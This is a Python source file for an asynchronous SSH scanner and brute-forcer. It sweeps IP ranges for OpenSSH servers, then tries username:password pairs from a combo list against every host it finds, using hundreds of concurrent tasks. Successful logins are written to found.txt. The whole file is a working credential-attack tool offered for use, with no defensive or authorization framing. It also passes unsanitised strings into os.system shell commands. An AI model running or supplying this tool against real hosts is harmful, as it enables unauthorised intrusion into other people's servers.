# -*- coding: utf-8 -*-

"""
The MIT License (MIT)

Copyright (c) 2019-2021 MrReacher

Permission is hereby granted, free of charge, to any person obtaining a
copy of this software and associated documentation files (the "Software"),
to deal in the Software without restriction, including without limitation
the rights to use, copy, modify, merge, publish, distribute, sublicense,
and/or sell copies of the Software, and to permit persons to whom the
Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
DEALINGS IN THE SOFTWARE.
"""

import os
import sys
import time
import asyncio
import argparse
import asyncssh
import ipaddress

from pathlib import Path

def generate_range(ranges):
    splitted = ranges.split('.')
    netmask = len(splitted) * 8
    for i in range(len(splitted), 4):
        splitted.append('0')

    fmt = '.'.join(splitted)
    network = f'{fmt}/{netmask}'
    output = [str(x) for x in ipaddress.ip_network(network).hosts()]

    return output

def read_combo(file):
    check = Path(file)
    if not check.is_file():
        raise Exception('File is not in path. Make sure there is a combo list.')

    with open(file, 'r') as f:
        scan = f.read()

    combo = []
    for entry in scan.split():
        try:
            username, password = entry.split(':')
        except ValueError:
            raise Exception(f'Invalid combo list. ({entry})')

        entry = {'username': username, 'password': password}
        combo.append(entry)

    return combo

def read_ips(file):
    check = Path(file)
    if not check.is_file():
        return False

    with open(file, 'r') as f:
        scan = f.read()

    combo = [entry for entry in scan.split()]
    if not combo:
        return False

    return combo

def chunk_list(seq, size):
    return (seq[i::size] for i in range(size))

async def run_ssh(ip, username, password):
    client = asyncssh.connect(ip, username=username, password=password, known_hosts=None)
    async with (await asyncio.wait_for(client, timeout=timeout)) as conn:
        result = await conn.run('uptime -p', check=True)
        return result.stdout

async def port_worker(name, queue):
    check = await queue.get()
    print(f'[{name}] [{len(check)}]')
    for c in check:
        fut = asyncio.open_connection(c, 22)
        try:
            reader, writer = await asyncio.wait_for(fut, timeout=timeout)
        except Exception:
            pass
        else:
            try:
                data = await reader.read(1024)
                if 'OpenSSH' in data.decode('utf8'):
                    os.system(f'echo {c} >> {file}')
            except Exception:
                pass
            else:
                writer.close()

    queue.task_done()

async def brute_worker(name, queue):
    check = await queue.get()
    for combo in combos:
        username = combo['username']
        password = combo['password']
        print(f'[{name}] [{len(check)}] Trying {username}:{password}')
        for c in check:
            try:
                result = await run_ssh(c, username, password)
            except Exception:
                pass
            else:
                found = f'[+] Found {c} -> {username}:{password} -> {result}'
                os.system(f'echo "{found}" >> found.txt')
                print(found)

            #except (OSError, asyncio.TimeoutError, ConnectionRefusedError):
            #    pass
            #except (asyncssh.PermissionDenied, asyncssh.ConnectionLost):
            #    pass

    queue.task_done()

async def main(loop):
    queue = asyncio.Queue()

    tasks = []
    chunk_ranges = chunk_list(ranges, threads)
    for r in chunk_ranges:
        queue.put_nowait(r)

    for t in range(threads):
        name = f'Task {t:>4}'
        func = port_worker if port else brute_worker
        task = loop.create_task(func(name, queue))
        tasks.append(task)

    started_at = time.monotonic()
    await queue.join()
    total_slept_for = time.monotonic() - started_at

    for task in tasks:
        task.cancel()

    await asyncio.gather(*tasks, return_exceptions=True)
    print(f'Total elapsed: {total_slept_for:.2f} seconds')

if __name__ == '__main__':
    description = 'Fully asynchronous SSH Scanner made in Python3.6'
    parser = argparse.ArgumentParser(description=description)
    
    # required argument no matter what
    parser.add_argument('--file', '-f', type=str, required=True)
    
    # optional arguments
    # `port` can only be used with `range` and vice-versa
    # `combo` cannot be used with either `port` or `range`
    parser.add_argument('--port', '-p', action='store_true', required='--range' in sys.argv)
    parser.add_argument('--range', '-r', type=str, required='--port' in sys.argv)
    parser.add_argument('--combo', '-c', type=str)
    
    # default arguments
    parser.add_argument('--timeout', type=int, default=10)
    parser.add_argument('--threads', type=int, default=300)
    
    args = parser.parse_args()

    file = args.file
    port = args.port
    ranges = read_ips(file)
    if not ranges:
        if not port:
            parser.error(f'file `{file}` is empty or does not exist. '
                            'you should do a portscan instead')

        ranges = generate_range(args.range)

    combo = args.combo
    if combo:
        combos = read_combo(combo)

    timeout = args.timeout
    if timeout > 30:
        print('WARNING: setting timeout to >30s will have a huge impact ' \
                'on the time it takes to complete the bruteforce')

    threads = args.threads
    if threads > 2000:
        print('WARNING: setting threads to >2000 might cause several issues')

    print(f'Starting with {threads} threads\n'
            f'Generated {len(ranges)} IPs\n'
            #f'Using {len(combos)} combinations\n'
            '=============================')

    time.sleep(2)
    loop = asyncio.get_event_loop()

    try:
        loop.run_until_complete(main(loop))
    except KeyboardInterrupt:
        print('Ok.')
    finally:
        loop.close()
